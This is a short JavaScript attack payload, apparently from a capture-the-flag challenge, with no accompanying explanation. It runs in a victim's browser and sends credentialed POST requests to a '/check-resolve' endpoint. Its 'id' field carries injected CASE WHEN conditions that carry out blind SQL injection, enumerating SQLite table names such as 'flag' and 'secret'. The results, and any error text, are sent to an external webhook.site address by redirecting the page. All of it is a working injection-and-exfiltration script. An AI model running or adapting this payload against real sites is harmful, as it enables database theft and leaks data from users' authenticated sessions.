(async()=>{
  try{
    const hook='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/';
    const tests = [
      ["tcount>0", "(SELECT count(*) FROM sqlite_master WHERE type='table')>0"],
      ["has_cases", "(SELECT count(*) FROM sqlite_master WHERE type='table' AND name='cases')>0"],
      ["has_reports", "(SELECT count(*) FROM sqlite_master WHERE type='table' AND name='reports')>0"],
      ["has_flag", "(SELECT count(*) FROM sqlite_master WHERE type='table' AND name='flag')>0"],
      ["has_secret", "(SELECT count(*) FROM sqlite_master WHERE type='table' AND name='secret')>0"],
      ["firstchar_c", "substr((SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table'),1,1)='c'"],
      ["firstchar_r", "substr((SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table'),1,1)='r'"],
      ["firstchar_f", "substr((SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table'),1,1)='f'"]
    ];

    const out = [];
    for (const [label, cond] of tests){
      const body = new URLSearchParams();
      body.append('id', `CASE WHEN (${cond}) THEN 6 ELSE 7 END`);
      const r = await fetch('/check-resolve',{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body,
        credentials:'include'
      });
      const t = await r.text();
      out.push(label + ' => ' + (t.includes('Not yet') ? 'TRUE' : 'FALSE'));
    }

    location = hook + '?d=' + encodeURIComponent(out.join(' || '));
  }catch(e){
    location = 'https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?err=' + encodeURIComponent(e.toString());
  }
})();